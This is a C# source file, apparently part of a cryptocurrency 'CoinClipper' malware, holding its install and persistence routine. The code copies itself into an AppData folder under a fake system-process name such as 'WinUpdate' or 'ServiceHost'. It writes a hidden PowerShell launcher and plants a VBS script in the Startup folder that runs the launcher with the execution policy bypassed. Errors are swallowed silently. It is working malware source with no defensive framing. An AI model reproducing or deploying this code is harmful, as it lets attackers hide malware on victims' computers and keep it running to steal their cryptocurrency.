using System;
using System.Diagnostics;
using System.IO;

namespace CoinClipper
{
    class Copy
    {
        private static string installBasePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft", "SystemData");

        public static string Install()
        {
            try
            {
                Directory.CreateDirectory(installBasePath);

                string markerFile = Path.Combine(installBasePath, "installed.txt");
                if (File.Exists(markerFile))
                {
                    string oldExePath = File.ReadAllText(markerFile).Trim();
                    if (!string.IsNullOrEmpty(oldExePath) && File.Exists(oldExePath))
                    {
                        return oldExePath;
                    }
                }

  
                string targetExe = Path.Combine(installBasePath, GenerateLegitFileName());
                string currentProcess = Process.GetCurrentProcess().MainModule.FileName;
                File.Copy(currentProcess, targetExe, true);
                File.WriteAllText(markerFile, targetExe);

          
                CreatePowerShellAndBatForStartup(targetExe);

                return targetExe;
            }
            catch (Exception)
            {
              
                return null;
            }
        }

        private static string GenerateRandomString(int length)
        {
            const string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            Random random = new Random();
            char[] stringChars = new char[length];
            for (int i = 0; i < length; i++)
            {
                stringChars[i] = chars[random.Next(chars.Length)];
            }
            return new string(stringChars);
        }

        private static string GenerateLegitFileName()
        {
            string[] names = { "ServiceHost", "WinUpdate", "SysHelper", "DataSync" };
            string randomSuffix = GenerateRandomString(5);
            return $"{names[new Random().Next(names.Length)]}{randomSuffix}.exe";
        }

        private static void CreatePowerShellAndBatForStartup(string payloadPath)
        {
            try
            {
                string startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);

                
                string psScriptPath = Path.Combine(installBasePath, GenerateRandomString(8) + ".ps1");
                string psScriptContent = $"Start-Process -FilePath '{payloadPath}' -WindowStyle Hidden";
                File.WriteAllText(psScriptPath, psScriptContent);

       
                string escapedPsScriptPath = psScriptPath.Replace("\\", "\\\\");

       
                string vbsFilePath = Path.Combine(startupFolder, GenerateRandomString(8) + ".vbs");

             
                string vbsContent =
                    "Set objShell = CreateObject(\"Wscript.Shell\")\n" +
                    $"objShell.Run \"powershell.exe -ExecutionPolicy Bypass -File \"\"{escapedPsScriptPath}\"\"\", 0, False";

                File.WriteAllText(vbsFilePath, vbsContent);
            }
            catch (Exception)
            {
               
            }
        }

    }
}
